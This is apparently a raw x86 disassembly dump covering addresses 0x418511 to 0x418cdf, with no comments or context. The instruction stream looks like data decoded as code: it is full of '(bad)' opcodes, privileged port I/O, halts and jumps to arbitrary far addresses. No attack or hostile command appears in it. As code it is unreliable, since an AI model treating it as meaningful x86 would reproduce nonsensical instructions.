  418511:	mov    dl,0x67
  418513:	mov    eax,0xce5cd8c0
  418518:	movq   QWORD PTR [ebx+0x66],mm1
  41851c:	or     al,BYTE PTR [esi]
  41851e:	cmp    al,0xda
  418521:	gs test al,0x20
  418524:	mov    eax,ds:0x2236a7ef
  418529:	jb     0x41858f
  41852b:	push   edx
  41852c:	mov    esi,0x8466de20
  418531:	ret    
  418532:	and    BYTE PTR [ecx-0x44],ah
  418535:	and    ah,BYTE PTR [eax+ebx*1]
  418538:	xchg   edx,eax
  418539:	and    DWORD PTR [esi-0x6d798f59],ecx
  41853f:	and    al,BYTE PTR [eax+0x6d55ef5e]
  418545:	jmp    0xdadae3b6
  41854a:	sub    al,0xb3
  41854c:	push   edi
  41854d:	fisubr DWORD PTR [esi+ebx*1-0x3292abb]
  418554:	push   eax
  418555:	jo     0x41856b
  418557:	add    dh,al
  418559:	xor    BYTE PTR [esi+0x61b56c51],0x64
  418560:	aas    
  418561:	adc    eax,0xc7de1558
  418566:	inc    ecx
  418567:	ins    BYTE PTR es:[edi],dx
  418568:	sub    eax,eax
  41856a:	jmp    0x1d61846e
  41856f:	or     eax,0xdc458a7d
  418574:	outs   dx,DWORD PTR ds:[esi]
  418575:	dec    esp
  418576:	dec    edi
  418577:	sbb    eax,0xd4e52926
  41857c:	sbb    bl,ah
  41857e:	sub    BYTE PTR [esi-0x1e],0x34
  418582:	pop    esi
  418583:	out    0xd3,eax
  418585:	in     al,0xd4
  418587:	or     BYTE PTR [esi-0x6c18193b],0x62
  41858e:	lahf   
  41858f:	pop    esp
  418590:	rcr    ebp,cl
  418592:	xchg   esp,eax
  418593:	sbb    cl,BYTE PTR [edx+0x50]
  418596:	jnp    0x4185ba
  418598:	scas   al,BYTE PTR es:[edi]
  418599:	pusha  
  41859a:	dec    esp
  41859b:	xchg   edx,eax
  41859c:	in     eax,0xcb
  41859e:	(bad)  
  41859f:	jae    0x418545
  4185a1:	jmp    0x4185c0
  4185a3:	es push 0x9d192304
  4185a9:	loope  0x418624
  4185ab:	(bad)  
  4185ac:	in     eax,dx
  4185ad:	hlt    
  4185ae:	xchg   DWORD PTR [eax+0x44a91919],ecx
  4185b4:	pop    esp
  4185b5:	jno    0x418602
  4185b7:	out    0x4f,al
  4185b9:	jge    0x41862b
  4185bb:	mov    dl,BYTE PTR [eax+0x43]
  4185be:	sub    DWORD PTR [edx+0x5886684f],ecx
  4185c4:	mov    WORD PTR [ecx-0x4592b3d4],?
  4185ca:	lds    edx,FWORD PTR ds:0xfbf1a652
  4185d0:	ret    0x9812
  4185d3:	fwait
  4185d4:	jmp    0xdb7b7675
  4185d9:	pop    es
  4185da:	jmp    DWORD PTR [ebx+0x7b]
  4185dd:	into   
  4185de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185df:	mov    BYTE PTR [edi-0xdbc307d],bl
  4185e5:	sbb    ebx,DWORD PTR [ebx]
  4185e7:	pop    edi
  4185e8:	(bad)  
  4185e9:	mov    ds:0x3ba07dfa,al
  4185ee:	cli    
  4185ef:	int    0x21
  4185f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f2:	or     DWORD PTR [esi],edx
  4185f4:	(bad)  
  4185f5:	sbb    eax,0x93f249d0
  4185fa:	jo     0x418652
  4185fc:	push   esi
  4185fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185fe:	push   esi
  4185ff:	mov    es:0x45801131,eax
  418605:	push   es
  418606:	repz (bad) 
  418608:	mov    bl,0xa8
  41860a:	inc    eax
  41860b:	sub    eax,0x64d4adde
  418610:	xchg   esp,eax
  418611:	push   ebp
  418612:	jbe    0x4185c6
  418614:	mov    ebp,0x8aeddb5c
  418619:	std    
  41861a:	out    0xf5,eax
  41861c:	jne    0x418669
  41861e:	out    dx,al
  41861f:	fadd   QWORD PTR [esi+0x28]
  418622:	mov    edx,ecx
  418624:	push   cs
  418625:	pop    ecx
  418626:	(bad)  
  418627:	retf   
  418628:	retf   
  418629:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41862a:	outs   dx,DWORD PTR ds:[esi]
  41862b:	loope  0x41863f
  41862d:	xor    eax,edx
  41862f:	mov    DWORD PTR [ebx],ebx
  418631:	inc    ecx
  418632:	push   ds
  418633:	xlat   BYTE PTR ds:[ebx]
  418634:	mov    cl,0x25
  418636:	ficom  DWORD PTR [eax+0x57b3c43f]
  41863c:	loope  0x41866c
  41863e:	loope  0x4185c7
  418640:	jne    0x4186b5
  418642:	inc    ebx
  418643:	mov    eax,0xdef6f99
  418648:	and    esi,ebx
  41864a:	xor    al,0xb7
  41864c:	mov    esi,0x14807f2a
  418651:	das    
  418652:	sbb    bh,BYTE PTR [esi-0x15]
  418655:	fild   WORD PTR [esi+0x27]
  418658:	(bad)  
  41865a:	adc    cl,BYTE PTR [esi-0x74dbb30]
  418660:	dec    edx
  418661:	mov    dh,0x44
  418663:	sbb    DWORD PTR [edx],esi
  418665:	enter  0xfbfe,0x6b
  418669:	sbb    al,0x3d
  41866b:	(bad)  
  41866c:	(bad)  
  41866d:	ds ins BYTE PTR es:[edi],dx
  41866f:	pop    esp
  418670:	and    esi,DWORD PTR [eax-0x31]
  418673:	inc    ebx
  418674:	add    DWORD PTR [esi],0xffffffe0
  418677:	sbb    eax,0x6439965
  41867c:	mov    edx,DWORD PTR [ebx+0x505da475]
  418682:	sahf   
  418683:	std    
  418684:	aas    
  418685:	lods   al,BYTE PTR ds:[esi]
  418686:	ins    BYTE PTR es:[edi],dx
  418687:	in     al,dx
  418688:	test   al,0x79
  41868a:	(bad)  
  41868b:	scas   al,BYTE PTR es:[edi]
  41868c:	or     bh,al
  41868e:	sub    eax,0x9292d2ad
  418693:	mov    bl,0xcf
  418695:	stc    
  418696:	cmp    eax,0x264482c6
  41869b:	xchg   BYTE PTR [esi-0xa28a380],dh
  4186a1:	add    ch,BYTE PTR [eax-0x59]
  4186a4:	call   0x4c74223d
  4186a9:	jnp    0x41862e
  4186ab:	aaa    
  4186ac:	ss jmp 0xbefe:0x95c6837d
  4186b4:	shl    bl,0x8e
  4186b7:	jecxz  0x4186b4
  4186b9:	mov    dl,bl
  4186bb:	sbb    al,0xe1
  4186bd:	jmp    0x459a18ae
  4186c2:	data16 mov ?,WORD PTR [ecx+eax*2+0x522521c9]
  4186ca:	call   0xad476af8
  4186cf:	or     DWORD PTR [edi],edx
  4186d1:	shr    BYTE PTR [ecx],1
  4186d3:	or     al,0x71
  4186d5:	test   eax,0x5d3ac4ee
  4186da:	add    BYTE PTR [esi-0x26491045],0x5c
  4186e1:	in     eax,0x37
  4186e3:	jge    0x41866c
  4186e5:	or     al,0xe
  4186e7:	add    DWORD PTR fs:[ebp+edx*1-0x77ee854c],esp
  4186ef:	pop    esi
  4186f0:	adc    edx,eax
  4186f2:	aas    
  4186f3:	push   ecx
  4186f4:	pop    ecx
  4186f5:	pop    esp
  4186f6:	ds (bad) 
  4186f9:	cmp    DWORD PTR [edx-0x20ae733d],ebx
  4186ff:	jle    0x41873a
  418701:	jae    0x418703
  418703:	bound  ebp,QWORD PTR [edx+0x4164f363]
  418709:	inc    edi
  41870a:	push   cs
  41870b:	loopne 0x4186e8
  41870d:	pop    ecx
  41870e:	mov    dl,0x39
  418710:	ins    BYTE PTR es:[edi],dx
  418711:	sub    edi,DWORD PTR [ebx-0x39]
  418714:	outs   dx,BYTE PTR ds:[esi]
  418715:	ins    DWORD PTR es:[edi],dx
  418716:	pop    edx
  418717:	stc    
  418718:	(bad)  
  41871a:	xchg   ecx,eax
  41871b:	or     BYTE PTR [ecx-0x49ac544],cl
  418721:	sar    DWORD PTR [esi],0xad
  418724:	push   ebp
  418725:	ror    BYTE PTR [ecx-0x61],1
  418728:	adc    DWORD PTR [ecx],edx
  41872a:	or     eax,0x26dec8e9
  41872f:	call   FWORD PTR [esi-0x5e]
  418732:	jb     0x418741
  418734:	js     0x41870f
  418736:	mov    eax,ds:0xb0a17c54
  41873b:	xchg   ebx,eax
  41873c:	inc    esi
  41873d:	sub    bh,BYTE PTR [esi-0x1e27a949]
  418743:	fsubr  QWORD PTR [ebx]
  418745:	int    0xe9
  418747:	push   es
  418748:	test   ecx,esp
  41874a:	(bad)  
  41874b:	out    0xfc,al
  41874d:	xchg   esp,eax
  41874e:	cmp    edi,DWORD PTR [ecx+0x3d]
  418751:	sbb    DWORD PTR [edx-0x4b56a00e],ebp
  418757:	inc    ecx
  418758:	fcom   DWORD PTR [eax-0x23]
  41875b:	pusha  
  41875c:	fidivr WORD PTR [ebp+esi*4-0x7e]
  418760:	ins    BYTE PTR es:[edi],dx
  418761:	scas   eax,DWORD PTR es:[edi]
  418762:	clc    
  418763:	enter  0x97ff,0xd7
  418767:	jl     0x41875b
  418769:	loop   0x418751
  41876b:	pop    ss
  41876c:	inc    esp
  41876d:	int3   
  41876e:	mov    al,ds:0x269feabe
  418773:	add    al,BYTE PTR ds:0xaa5d4c01
  418779:	test   al,0xa1
  41877b:	ficom  WORD PTR [edx+0x3e492c0]
  418781:	into   
  418782:	ret    0x87ff
  418785:	daa    
  418786:	sbb    al,0xef
  418788:	dec    ecx
  418789:	xor    al,0xa7
  41878b:	cs hlt 
  41878d:	xor    ecx,esi
  41878f:	mov    dl,0x5c
  418791:	(bad)
  418796:	test   eax,ecx
  418798:	(bad)  [eax+0x11]
  41879b:	adc    DWORD PTR [esi+ecx*1-0x20],eax
  41879f:	mov    ch,0x82
  4187a1:	sbb    dl,BYTE PTR [eax]
  4187a3:	xchg   ebx,eax
  4187a4:	ror    BYTE PTR [esi-0x71],cl
  4187a7:	js     0x418773
  4187a9:	and    dh,BYTE PTR [ecx]
  4187ab:	lds    edi,FWORD PTR [eax]
  4187ad:	mov    dl,0x76
  4187af:	inc    ecx
  4187b0:	add    dh,dl
  4187b2:	push   ds
  4187b3:	ss pop es
  4187b5:	vpshab ymm5,xmm2,[ebx+ebp*4]
  4187bb:	rol    DWORD PTR [ebp-0x2005d40b],cl
  4187c1:	outs   dx,DWORD PTR ds:[esi]
  4187c2:	call   0xcb5c:0xe965dbab
  4187c9:	call   0xc99a:0x42136f11
  4187d0:	dec    ebp
  4187d1:	sbb    DWORD PTR [ebx],esi
  4187d3:	and    BYTE PTR es:[ebx+ebx*1-0x3d],ch
  4187d8:	push   ebp
  4187d9:	mov    bl,0x3a
  4187db:	jae    0x4187c3
  4187dd:	cwde   
  4187de:	outs   dx,BYTE PTR ds:[esi]
  4187df:	(bad)  
  4187e0:	ror    BYTE PTR [esi+0xb],cl
  4187e3:	leave  
  4187e4:	inc    edx
  4187e5:	je     0x418842
  4187e7:	test   DWORD PTR [eax+esi*4+0x4bd11],ecx
  4187ee:	mov    edx,0x96519c8a
  4187f3:	sub    al,0x4b
  4187f5:	clc    
  4187f6:	sbb    DWORD PTR [esi],eax
  4187f8:	(bad)  
  4187f9:	sub    BYTE PTR [ebx+0x1a],ch
  4187fc:	repnz sbb eax,eax
  4187ff:	call   0x7dde:0xc5b2d07a
  418806:	lods   eax,DWORD PTR ds:[esi]
  418807:	loop   0x418869
  418809:	sub    eax,0x9dfd2a1
  41880e:	shl    DWORD PTR [esi],0x93
  418811:	mov    eax,ds:0x18154378
  418816:	ins    BYTE PTR es:[edi],dx
  418817:	push   ebp
  418818:	cld    
  418819:	pop    edi
  41881a:	add    ebp,esi
  41881c:	xor    eax,0xde3f678
  418821:	lea    eax,[edi]
  418823:	dec    esp
  418824:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418825:	xor    ebp,DWORD PTR [ebx]
  418827:	mov    edx,0x62179f5c
  41882c:	lock cmp DWORD PTR [edx+0x61],edx
  418830:	repnz cld 
  418832:	add    eax,DWORD PTR [ebp+0x5a2b196]
  418838:	xor    ebx,eax
  41883a:	inc    esi
  41883b:	and    eax,0x96c08a2
  418840:	or     eax,0xddd36886
  418845:	rol    DWORD PTR ds:0xb97a4c0f,1
  41884b:	retf   
  41884c:	out    0x95,al
  41884e:	xchg   ecx,eax
  41884f:	xchg   esi,eax
  418850:	cwde   
  418851:	scas   eax,DWORD PTR es:[edi]
  418852:	pop    ecx
  418853:	rcr    BYTE PTR [edx],0x6f
  418856:	mov    ch,dl
  418858:	push   0x17d339d0
  41885d:	adc    DWORD PTR [edx+ebx*8],edi
  418860:	cmp    ah,BYTE PTR [ebp+0x48925d7d]
  418866:	inc    ebx
  418867:	sub    BYTE PTR [ebx+ebx*4+0x4d],cl
  41886b:	xor    BYTE PTR [ebp+0x13bdfbca],ch
  418871:	push   0xc953db48
  418876:	xchg   edx,eax
  418877:	sbb    BYTE PTR [edi],ch
  418879:	shl    BYTE PTR [ebx+eax*1],cl
  41887c:	mov    ds:0xe8e9b39e,al
  418881:	aaa    
  418882:	mov    dh,0x3
  418884:	imul   esi,ebx,0xe5e339d2
  41888a:	cmp    DWORD PTR [esi-0x49],0x568b0eb4
  418891:	enter  0x2e29,0xbd
  418895:	lods   eax,DWORD PTR ds:[esi]
  418896:	inc    ebp
  418897:	jmp    0x1f275b25
  41889c:	mov    ebp,0xb5333b05
  4188a1:	dec    ebp
  4188a2:	stos   BYTE PTR es:[edi],al
  4188a3:	xrelease xchg DWORD PTR [eax-0x11172e97],edx
  4188aa:	cld    
  4188ab:	pop    esp
  4188ac:	test   ebp,edi
  4188ae:	push   es
  4188af:	mov    ss,WORD PTR [ecx-0x37]
  4188b2:	je     0x4188c7
  4188b4:	fwait
  4188b5:	scas   al,BYTE PTR es:[edi]
  4188b6:	es (bad) 
  4188b9:	inc    eax
  4188ba:	push   ecx
  4188bb:	in     al,dx
  4188bc:	adc    DWORD PTR ds:0xf2bd6106,ecx
  4188c2:	jmp    0x1ad1c38a
  4188c7:	mov    edi,0x86365f07
  4188cc:	cmp    eax,0xa7f7c6c7
  4188d1:	fs sub eax,0xba96411e
  4188d7:	dec    ebp
  4188d8:	sub    al,0x6c
  4188da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188db:	mov    bl,0xb4
  4188dd:	outs   dx,BYTE PTR ds:[esi]
  4188de:	dec    ebx
  4188df:	xchg   ebx,eax
  4188e0:	xchg   ebx,eax
  4188e1:	inc    ebx
  4188e2:	dec    ebx
  4188e3:	lea    ebp,[edi+0x12]
  4188e6:	add    al,0xbd
  4188e8:	mov    ch,0xde
  4188ea:	pop    es
  4188eb:	data16 jmp 0x418916
  4188ee:	pop    edx
  4188ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188f0:	sbb    eax,0x61601d7a
  4188f5:	dec    esi
  4188f6:	hlt    
  4188f7:	daa    
  4188f8:	mov    esi,0x6c3592a
  4188fd:	xchg   ecx,eax
  4188fe:	lds    ecx,FWORD PTR [esp+eax*4+0x40]
  418902:	mov    ds:0x15a62390,eax
  418907:	sahf   
  418908:	sbb    DWORD PTR [edi],ebp
  41890a:	inc    ecx
  41890b:	sub    BYTE PTR [eax-0x2559d2f8],dl
  418911:	fsub   DWORD PTR [ebp+0x17]
  418914:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  418916:	sbb    BYTE PTR [edx+0x58],dl
  418919:	mov    ah,0xbb
  41891b:	jge    0x418929
  41891d:	sbb    BYTE PTR [ebp+0x8],dl
  418920:	fnsave [edi+eiz*2+0x5a3e3a62]
  418927:	hlt    
  418928:	pusha  
  418929:	test   al,0x8a
  41892b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41892c:	jl     0x418967
  41892e:	imul   eax,edi,0x8be2f5cb
  418934:	jge    0x418964
  418936:	idiv   BYTE PTR [eax-0x5a407424]
  41893c:	pop    edi
  41893d:	push   eax
  41893e:	dec    eax
  41893f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418940:	add    eax,0xdbe5ea73
  418945:	fdiv   DWORD PTR [ecx]
  418947:	xor    DWORD PTR [edx-0x1a2bc157],ebp
  41894d:	out    0x5,eax
  41894f:	cmp    al,0xe5
  418951:	sub    edx,esi
  418953:	je     0x418952
  418955:	fdivr  DWORD PTR [esi]
  418957:	repz std 
  418959:	cmc    
  41895a:	push   edx
  41895b:	mov    ah,0x18
  41895d:	inc    esi
  41895e:	test   eax,0x69f9aa66
  418963:	ror    BYTE PTR [ebx],cl
  418965:	mov    dh,0x41
  418967:	jle    0x4188fe
  418969:	pop    eax
  41896a:	repnz adc ch,BYTE PTR [ecx]
  41896d:	sub    esp,eax
  41896f:	xadd   bh,al
  418972:	iret   
  418973:	jnp    0x418954
  418975:	mov    cl,0x62
  418977:	std    
  418978:	outs   dx,DWORD PTR ds:[esi]
  418979:	rcl    bl,1
  41897b:	jmp    0x90f7025d
  418980:	mov    ds,WORD PTR [ebp+0x70]
  418983:	mov    WORD PTR [ecx],fs
  418985:	mov    eax,0x5578f0fe
  41898a:	jb     0x418975
  41898c:	int3   
  41898d:	(bad)  
  41898e:	xchg   edi,eax
  41898f:	lea    esp,[esi]
  418991:	stos   BYTE PTR es:[edi],al
  418992:	stc    
  418993:	adc    esi,esi
  418995:	(bad)  
  418996:	leave  
  418997:	sub    DWORD PTR [edi],edx
  418999:	js     0x418959
  41899b:	imul   ecx,DWORD PTR [edx],0xffffffa7
  41899e:	(bad)  
  41899f:	in     al,dx
  4189a0:	xchg   ecx,eax
  4189a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189a2:	mov    ebx,fs
  4189a4:	and    ah,0xcb
  4189a7:	cmp    DWORD PTR [esi+0x69386540],0x1da5d07f
  4189b1:	ins    BYTE PTR es:[edi],dx
  4189b2:	icebp  
  4189b3:	test   eax,0xb245ed95
  4189b8:	int3   
  4189b9:	test   ebx,ecx
  4189bb:	pushf  
  4189bc:	mov    ebx,0xa31b59c1
  4189c1:	rcr    BYTE PTR [edi],0xc2
  4189c4:	outs   dx,BYTE PTR ds:[esi]
  4189c5:	call   DWORD PTR [edx+ebx*1]
  4189c8:	sub    esi,DWORD PTR ds:0x79e4da23
  4189ce:	sar    cl,cl
  4189d0:	shr    dl,cl
  4189d2:	in     al,dx
  4189d3:	adc    eax,0x7cfbbe1b
  4189d8:	jae    0x418a1a
  4189da:	xor    esi,ebx
  4189dc:	mov    DWORD PTR [esi+esi*8],ebx
  4189df:	aad    0xf1
  4189e1:	cdq    
  4189e2:	fsub   st(7),st
  4189e4:	xchg   BYTE PTR [ecx-0x6b71f52d],dh
  4189ea:	jecxz  0x4189be
  4189ec:	and    bh,BYTE PTR [edi]
  4189ee:	test   al,0x12
  4189f0:	xlat   BYTE PTR ds:[ebx]
  4189f1:	xchg   esp,eax
  4189f2:	out    0xaa,al
  4189f4:	pop    esp
  4189f5:	dec    esi
  4189f6:	mov    ds:0xb1096df2,eax
  4189fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fc:	inc    eax
  4189fd:	add    BYTE PTR [esi-0x52],0x3b
  418a01:	adc    eax,0x5a394be3
  418a06:	jb     0x418a1c
  418a08:	bound  edx,QWORD PTR [esp+ebx*4+0x66b07bd7]
  418a0f:	popf   
  418a10:	jmp    0xc190:0xb8b632ec
  418a17:	lahf   
  418a18:	icebp  
  418a19:	and    al,0x95
  418a1b:	sbb    DWORD PTR [eax+0x6a],ebp
  418a1e:	imul   edi,DWORD PTR [ecx-0x1db5d99f],0xfffffffe
  418a25:	push   ss
  418a26:	xor    bh,BYTE PTR [esi*1+0x54e3a762]
  418a2d:	(bad)  [edx]
  418a2f:	mov    al,ds:0x59d14431
  418a34:	pop    esp
  418a35:	mov    ah,0xf7
  418a37:	mov    ds:0x76e5ef7b,al
  418a3c:	mov    esi,0x2622d79c
  418a41:	cs mov ecx,esi
  418a44:	clc    
  418a45:	sub    DWORD PTR es:[edi+0x58b54022],0x74
  418a4d:	and    al,0xc3
  418a4f:	fsub   DWORD PTR [ebp-0x18ec056d]
  418a55:	addr16 push es
  418a57:	mov    BYTE PTR [ecx+0x61],dh
  418a5a:	cmp    DWORD PTR [ebp-0x2e],ecx
  418a5d:	or     cl,ch
  418a5f:	inc    ebp
  418a60:	adc    eax,0x72c6a9ca
  418a65:	hlt    
  418a66:	adc    DWORD PTR [edx],0x9b29b8da
  418a6c:	ror    DWORD PTR [esi-0x4b36af07],1
  418a72:	mov    edi,0x1a6cd52a
  418a77:	out    dx,al
  418a78:	mov    esi,ebx
  418a7a:	inc    esp
  418a7b:	sub    eax,DWORD PTR [ecx+0x2d653fa8]
  418a81:	add    BYTE PTR [ecx+0x2d],dl
  418a84:	add    DWORD PTR [esi],esp
  418a86:	dec    edx
  418a87:	inc    eax
  418a88:	ins    DWORD PTR es:[edi],dx
  418a89:	xchg   edx,eax
  418a8a:	inc    esp
  418a8b:	loope  0x418a36
  418a8d:	cs fs out dx,al
  418a90:	rcr    ch,0x8b
  418a93:	mov    ch,ah
  418a95:	dec    esp
  418a96:	(bad)  
  418a97:	pop    edi
  418a98:	and    cl,al
  418a9a:	push   esi
  418a9b:	(bad)  
  418a9c:	push   cs
  418a9d:	arpl   WORD PTR [edx+ebp*1],sp
  418aa0:	jl     0x418a3d
  418aa2:	(bad)  
  418aa3:	ret    
  418aa4:	pop    ss
  418aa5:	dec    ebp
  418aa6:	jmp    0xaee:0x5f5613d3
  418aad:	cdq    
  418aae:	lock stos BYTE PTR es:[edi],al
  418ab0:	sub    eax,0xed455df5
  418ab5:	(bad)  
  418ab6:	cli    
  418ab7:	sbb    dl,BYTE PTR [eax+0x4063c73f]
  418abd:	push   edx
  418abe:	mov    esp,0x454bc96
  418ac3:	cwde   
  418ac4:	das    
  418ac5:	js     0x418aad
  418ac7:	jbe    0x418afc
  418ac9:	(bad)  
  418aca:	mov    dl,0xe3
  418acc:	rol    ch,0x91
  418acf:	jmp    0xba1b:0x406bb923
  418ad6:	int    0xdd
  418ad8:	test   al,0xb8
  418ada:	add    al,0xcc
  418adc:	imul   DWORD PTR [ecx+0x5e334fb1]
  418ae2:	loopne 0x418b33
  418ae4:	lock sbb eax,DWORD PTR [esi-0x4c]
  418ae8:	adc    eax,0x43c93490
  418aed:	jbe    0x418b3e
  418aef:	loop   0x418b18
  418af1:	sub    BYTE PTR [edx],ah
  418af3:	adc    eax,esi
  418af5:	xor    ecx,0xffffffaa
  418af8:	mov    edx,0x96ad4560
  418afd:	pop    esi
  418afe:	leave  
  418aff:	ja     0x418b48
  418b01:	test   eax,0xd5060107
  418b06:	sbb    cl,cl
  418b08:	std    
  418b09:	in     al,dx
  418b0a:	aas    
  418b0b:	jmp    0xaa77:0xbe9f0400
  418b12:	(bad)  
  418b13:	dec    DWORD PTR [eax+0x5d]
  418b16:	cli    
  418b17:	in     eax,dx
  418b18:	mov    ebp,0x8c4f100c
  418b1d:	and    edx,ebx
  418b1f:	and    eax,0xc6bff7a4
  418b24:	fwait
  418b25:	lods   eax,DWORD PTR ds:[esi]
  418b26:	add    al,0x7d
  418b28:	jg     0x418b76
  418b2a:	sar    DWORD PTR [ecx+0x6d043fdf],1
  418b30:	sbb    eax,0xc5af1760
  418b35:	pop    ds
  418b36:	pusha  
  418b37:	ret    
  418b38:	dec    eax
  418b39:	push   edi
  418b3a:	pop    ecx
  418b3b:	sbb    ebx,edi
  418b3d:	ficomp DWORD PTR ss:[ebx]
  418b40:	push   0xf005af9d
  418b45:	mov    ds:0xaaf91d08,al
  418b4a:	sar    al,0x87
  418b4d:	stos   BYTE PTR es:[edi],al
  418b4e:	and    BYTE PTR [ecx-0x797c8490],bh
  418b54:	sahf   
  418b55:	pop    eax
  418b56:	sub    BYTE PTR [ebx+esi*1],al
  418b59:	cs adc bh,ch
  418b5c:	xor    eax,0xbe24d0bb
  418b61:	ja     0x418b8f
  418b63:	out    dx,eax
  418b64:	pushw  0xa03e
  418b68:	ret    
  418b69:	cmp    ecx,ecx
  418b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b6c:	rcl    BYTE PTR [edi+0x27],cl
  418b6f:	xchg   edx,eax
  418b70:	mov    eax,ds:0x56b7d135
  418b75:	mov    edx,eax
  418b77:	stos   BYTE PTR es:[edi],al
  418b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b79:	push   ds
  418b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b7b:	fiadd  WORD PTR [eax]
  418b7d:	xor    bh,BYTE PTR [ebx-0x6bb1b707]
  418b83:	or     eax,0x97545bbc
  418b88:	and    BYTE PTR [edi+edi*1+0x3c],ah
  418b8c:	pop    edi
  418b8d:	test   BYTE PTR [ecx+0x5c],bh
  418b90:	push   esp
  418b91:	push   edi
  418b92:	push   eax
  418b93:	call   0xd53eed46
  418b98:	js     0x418b50
  418b9a:	test   al,0xc6
  418b9c:	pop    ebp
  418b9d:	and    al,0x8d
  418b9f:	repnz push ebx
  418ba1:	mov    ah,0x4d
  418ba3:	dec    eax
  418ba4:	sbb    edi,DWORD PTR [ecx-0x3ad60d95]
  418baa:	out    dx,eax
  418bab:	cmp    dl,BYTE PTR [edi+0x15d1a1bd]
  418bb1:	loopne 0x418b59
  418bb3:	push   es
  418bb4:	mov    al,0xc6
  418bb6:	push   esp
  418bb7:	jmp    0x3c47edda
  418bbc:	xor    al,0xd0
  418bbe:	xchg   ebp,eax
  418bbf:	and    al,0x69
  418bc1:	sub    al,0xd0
  418bc3:	mov    ebx,0xd2a8a87b
  418bc8:	pop    es
  418bc9:	dec    edi
  418bca:	pop    ss
  418bcb:	hlt    
  418bcc:	int    0x35
  418bce:	aaa    
  418bcf:	xor    al,0x51
  418bd1:	adc    ah,bh
  418bd3:	xchg   esp,eax
  418bd4:	mov    cl,0xa9
  418bd6:	(bad)  
  418bd7:	sar    BYTE PTR [ecx-0x2869dcf8],cl
  418bdd:	ins    BYTE PTR es:[edi],dx
  418bde:	push   ebp
  418bdf:	dec    sp
  418be1:	dec    esp
  418be2:	out    0xb0,al
  418be4:	sbb    BYTE PTR [eax],bh
  418be6:	loop   0x418b94
  418be8:	pop    es
  418be9:	push   ds
  418bea:	jge    0x418c61
  418bec:	sar    DWORD PTR [bx-0xc0d],1
  418bf1:	int    0x6b
  418bf3:	aaa    
  418bf4:	push   0xb2b80114
  418bf9:	shr    DWORD PTR [edi],0x8
  418bfc:	xor    al,0x38
  418bfe:	nop
  418bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c00:	jg     0x418c17
  418c02:	fld    DWORD PTR [ebx+0x4b1a1dfa]
  418c08:	mov    ds:0xe5b3bb4c,al
  418c0d:	aas    
  418c0e:	dec    edi
  418c0f:	or     al,0xd7
  418c11:	push   ebx
  418c12:	jmp    0xecb1:0x627e680b
  418c19:	inc    ebx
  418c1a:	push   ebp
  418c1b:	mov    cl,0xe8
  418c1d:	push   es
  418c1e:	push   0xf25a509f
  418c23:	out    dx,al
  418c24:	pop    ebx
  418c25:	jno    0x418c28
  418c27:	adc    esp,DWORD PTR [eax+0x23]
  418c2a:	pop    ebx
  418c2b:	int3   
  418c2c:	test   DWORD PTR [bx+si],ebp
  418c2f:	xor    esp,ebp
  418c31:	lock add esi,DWORD PTR [edi+0x566c34e7]
  418c38:	mov    ah,0x83
  418c3a:	retf   
  418c3b:	sbb    bl,BYTE PTR [edx-0x4403b64e]
  418c41:	mov    ah,0x44
  418c43:	in     al,dx
  418c44:	pop    ebp
  418c45:	jno    0x418cba
  418c47:	adc    BYTE PTR [esi],dl
  418c49:	popa   
  418c4a:	sbb    esi,DWORD PTR [esp+esi*4-0x28]
  418c4e:	pop    ds
  418c4f:	pop    ebp
  418c50:	xor    edi,DWORD PTR [eax]
  418c52:	daa    
  418c53:	loope  0x418c07
  418c55:	mov    dl,0xe
  418c57:	das    
  418c58:	or     esi,DWORD PTR [ebp+eiz*2+0x71]
  418c5c:	mov    eax,0xe9965aaa
  418c61:	in     eax,dx
  418c62:	jns    0x418c1c
  418c64:	mov    cl,0xe7
  418c66:	and    BYTE PTR [edi-0x3e0d50d5],ch
  418c6c:	repnz xchg ebx,eax
  418c6e:	sbb    BYTE PTR [ebx+eax*8-0x7c],cl
  418c72:	fucomip st,st(7)
  418c74:	sbb    al,0x1
  418c76:	call   FWORD PTR [ebx-0x2bd7433b]
  418c7c:	mov    DWORD PTR [ebp+0x77dd2e16],esp
  418c82:	pop    es
  418c83:	dec    ebp
  418c84:	adc    DWORD PTR [ecx+0xb3d0aac],esp
  418c8a:	xchg   esp,eax
  418c8b:	shl    edx,1
  418c8d:	adc    cl,BYTE PTR [eax-0x28]
  418c90:	add    BYTE PTR ds:0x89749c21,0xc0
  418c97:	push   ss
  418c98:	add    BYTE PTR [ecx],ch
  418c9a:	push   ebp
  418c9b:	dec    edx
  418c9c:	popf   
  418c9d:	push   ebp
  418c9e:	fs jb  0x418d10
  418ca1:	in     eax,0xcb
  418ca3:	add    BYTE PTR [eax-0x5f4e647d],ch
  418ca9:	clc    
  418caa:	mov    edi,0xd8d01a16
  418caf:	iret   
  418cb0:	scas   eax,DWORD PTR es:[edi]
  418cb1:	xor    edi,ecx
  418cb3:	dec    ebx
  418cb4:	daa    
  418cb5:	aad    0x33
  418cb7:	les    edi,FWORD PTR [ecx]
  418cb9:	out    0xd5,al
  418cbb:	or     al,0x9f
  418cbd:	and    DWORD PTR [esi+0x26c2abce],ebp
  418cc3:	(bad)  
  418cc4:	scas   al,BYTE PTR es:[edi]
  418cc5:	push   ds
  418cc6:	xchg   esi,eax
  418cc7:	pop    ds
  418cc8:	sahf   
  418cc9:	sar    BYTE PTR [eax+0x27e1aa2c],cl
  418ccf:	cli    
  418cd0:	adc    BYTE PTR [esi+edi*1+0xb7bef08],ch
  418cd7:	mov    fs:0x560f8e8,al
  418cdd:	dec    cx
  418cdf:	ja     0x418ce6
